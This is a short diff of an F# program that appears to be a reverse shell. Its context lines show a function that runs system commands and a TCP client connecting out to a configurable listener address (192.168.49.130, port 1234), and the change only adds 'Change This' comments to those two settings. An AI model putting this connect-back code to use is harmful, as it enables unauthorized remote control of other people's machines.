@@ -23,8 +23,8 @@ let runCommand (cmd: string): string * string  =
     let stderr = p.StandardError.ReadToEnd()
     (stdout, stderr)
 
-let lhost = "192.168.49.130"
-let lport = 1234
+let lhost = "192.168.49.130" // Change This 
+let lport = 1234             // Change This
 let client = new TcpClient(lhost, lport)
 
 exception BreakException
